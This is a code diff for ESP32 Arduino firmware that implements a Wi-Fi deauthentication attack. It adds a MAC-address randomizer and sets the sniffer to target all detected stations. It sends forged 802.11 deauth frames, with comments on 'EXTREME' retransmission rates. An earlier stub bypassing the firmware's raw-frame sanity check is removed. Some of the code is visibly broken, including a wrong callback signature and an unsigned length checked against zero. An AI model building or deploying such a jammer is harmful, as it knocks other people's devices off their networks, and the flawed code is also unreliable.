@@ -1,25 +1,42 @@
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    return 0;
-}
-
+// vim: set noet sw=4 ts=4 sts=4 et ft=ino :
+// -*- mode:arduino; -*-
+// --------------------------------------------------------
+// Copyright (C) 2025 by Anoduck, The Anonymous Duck
+// https://anoduck.mit-license.org
+// --------------------------------------------------------
+// Referencing documentation on wifi
+// https://github.com/espressif/arduino-esp32/tree/master/libraries/WiFi/examples
 // Include Statements
 // -----------------------------------------
 #include "WiFi.h"
-#include "esp_wifi.h"
-#include "esp_pm.h"
+#include <esp_wifi.h>
+#include <esp_pm.h>
+#include <esp_wifi_netif.h>
+#include <esp_wifi_types.h>
+#include <esp_wifi_types_generic.h>
+#include <esp_wifi_ap_get_sta_list.h>
+#include "wifi_tx.cpp"
+#include "types.h"
+#include <MacAddress.h>
 
 // Constant Statements
 // -----------------------------------------
 // GPIO 2 CONSTANT
 const int LED_PIN = 2;
 
+// Initialize Mac Randomizer
+// ----------------------------------------
+MacRandomizer macRandom;
+
 // Deauth Constants
 // -----------------------------------------
-const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
-const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
-const mac_hdr_t *mac_header = &packet->hdr;
+// const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)cbuf;
+// const wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
+// const mac_hdr_t *mac_header = &packet->hdr;
 
-const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+// const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+
+const uint8_t SCAN_ROUNDS = 5;
 
 // Power Save Constants
 // -----------------------------------------
@@ -63,6 +80,7 @@ void blink_led(int num_times, int blink_duration);
 // ----------------------------------------------
 void net_conf();
 int scan_net(void);
+IRAM_ATTR void sniffer();
 void initPowerManager();
 void enableSleep();
 void startSleep();
@@ -84,7 +102,7 @@ int wifi_channel = 1;
 // Let's create an array which holds the channels we want to hop back in forth on.
 // For this we will use: 1,3,6,10,11,14
 // we need to check this before trying.
-int ch_array[6] = {1, 3, 6, 10};
+int CH_ARRAY[6] = {1, 3, 6, 9, 11};
 
 // Now we need to create a new variable for hopspeed. We set our pretty low for faster hops.
 int hop_delay = 5;
@@ -93,54 +111,6 @@ int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for f
 int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
 int deauthPacketRetransmissions = 40; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
 int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets
-
-// ===============================================================
-// types
-// ---------------------------------------------------------------
-typedef struct {
-  uint8_t frame_control[2] = { 0xC0, 0x00 };
-  uint8_t duration[2];
-  uint8_t station[6];
-  uint8_t sender[6];
-  uint8_t access_point[6];
-  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
-  uint16_t reason;
-} deauth_frame_t;
-
-typedef struct {
-  uint16_t frame_ctrl;
-  uint16_t duration;
-  uint8_t dest[6];
-  uint8_t src[6];
-  uint8_t bssid[6];
-  uint16_t sequence_ctrl;
-  uint8_t addr4[6];
-} mac_hdr_t;
-
-typedef enum {
-  WIFI_PKT_MGMT,  /**< Management frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
-  WIFI_PKT_CTRL,  /**< Control frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
-  WIFI_PKT_DATA,  /**< Data frame, indiciates 'buf' argument is wifi_promiscuous_pkt_t */
-  WIFI_PKT_MISC  /**< Other type, such as MIMO etc. 'buf' argument is wifi_promiscuous_pkt_t but the payload is zero length. */
-} wifi_promiscuous_pkt_type_t;
-
-typedef struct {
-  unsigned vers:2;
-  wifi_promiscuous_pkt_type_t type:2;
-  wifi_mgmt_subtypes_t subtype:4;
-  unsigned ds:2;
-  unsigned moreFrag:1;
-  unsigned retry:1;
-  unsigned pwrMgt:1;
-  unsigned moreData:1;
-  unsigned protect:1;
-  unsigned order:1;
-} __attribute__((packed)) wifi_80211_fctl;
-
-typedef struct {
-  mac_hdr_t hdr;
-  uint8_t payload[0];
-} wifi_packet_t;
 
 // ------------------------------------------------------------------------------------------
 // Functions
@@ -152,6 +122,8 @@ const wifi_promiscuous_filter_t filt = {
 deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
 int eliminated_stations;
+
+
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
@@ -171,9 +143,14 @@ esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, b
 //}
 
 // ----------------------------------------------------------------------------------------------
-// Sniffer Function |  wifi_promiscuous_pkt_type_t type
+// Sniffer Function | wifi_promiscuous_cb_t |  wifi_promiscuous_pkt_type_t type
 // ----------------------------------------------------------------------------------------------
-IRAM_ATTR void sniffer(void *buf) {
+IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_t type) {
+  wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)buf;
+  wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
+  mac_hdr_t *mac_header = &packet->hdr;
+  uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+
   if (packet_length < 0) return;
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
@@ -198,27 +175,19 @@ IRAM_ATTR void sniffer(void *buf) {
 //-------------------------------------------------
 // Start Deauthentication
 // -----------------------------------------------
-void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
+void start_deauth(int wifi_number, uint16_t reason) {
   eliminated_stations = 0;
-  deauth_type = attack_type;
 
   deauth_frame.reason = reason;
 
-  if (deauth_type == DEAUTH_TYPE_SINGLE) {
-    DEBUG_PRINT("Starting Deauth-Attack on network: ");
-    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
-    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
-    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
-    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
-  } else {
-    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
-    WiFi.softAPdisconnect();
-    WiFi.mode(WIFI_MODE_STA);
-  }
+  DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
+  WiFi.softAPdisconnect();
+  WiFi.mode(WIFI_MODE_STA);
 
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
   esp_wifi_set_promiscuous_rx_cb(&sniffer);
+  WiFi.begin();
 }
 
 // ---------------------------------------------------------
@@ -252,9 +221,10 @@ void setup() {
 
   // Enable promiscuous mode
   esp_wifi_set_promiscuous(true);
-  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
-  esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B);
-
+  // Preliminary set channel to 6
+  esp_wifi_set_channel(WiFi.channel(6), WIFI_SECOND_CHAN_NONE);
+  // esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B);
+  WiFi.begin();
   Serial.println("Scanning for networks...");
 }
 
